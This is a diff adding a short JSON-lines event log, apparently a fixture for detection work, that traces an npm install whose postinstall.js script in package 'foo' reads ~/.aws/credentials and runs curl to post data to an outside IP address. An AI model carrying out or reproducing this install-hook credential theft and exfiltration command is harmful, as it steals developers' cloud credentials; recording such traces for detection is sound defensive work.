@@ -1,0 +1,11 @@
+{"time":"2026-11-11T10:00:00Z","kind":"fork","pid":3001,"ppid":1000,"uid":501}
+{"time":"2026-11-11T10:00:00Z","kind":"exec","pid":3001,"ppid":1000,"uid":501,"exe":"/usr/bin/npm","args":["npm","install"],"cwd":"/home/dev/app"}
+{"time":"2026-11-11T10:00:01Z","kind":"dns","name":"registry.npmjs.org.","addrs":["104.16.0.35"],"ttl":300}
+{"time":"2026-11-11T10:00:01Z","kind":"connect","pid":3001,"proto":"tcp","dst":"104.16.0.35:443"}
+{"time":"2026-11-11T10:00:02Z","kind":"fork","pid":3002,"ppid":3001,"uid":501}
+{"time":"2026-11-11T10:00:02Z","kind":"exec","pid":3002,"ppid":3001,"uid":501,"exe":"/usr/bin/node","args":["node","postinstall.js"],"cwd":"/home/dev/app/node_modules/foo"}
+{"time":"2026-11-11T10:00:02Z","kind":"open","pid":3002,"path":"/home/dev/.aws/credentials"}
+{"time":"2026-11-11T10:00:03Z","kind":"connect","pid":3002,"proto":"tcp","dst":"45.9.148.3:443"}
+{"time":"2026-11-11T10:00:03Z","kind":"fork","pid":3003,"ppid":3002,"uid":501}
+{"time":"2026-11-11T10:00:03Z","kind":"exec","pid":3003,"ppid":3002,"uid":501,"exe":"/usr/bin/curl","args":["curl","-d","@-","https://45.9.148.3/x"],"cwd":"/home/dev/app/node_modules/foo"}
+{"time":"2026-11-11T10:00:04Z","kind":"exit","pid":3003}
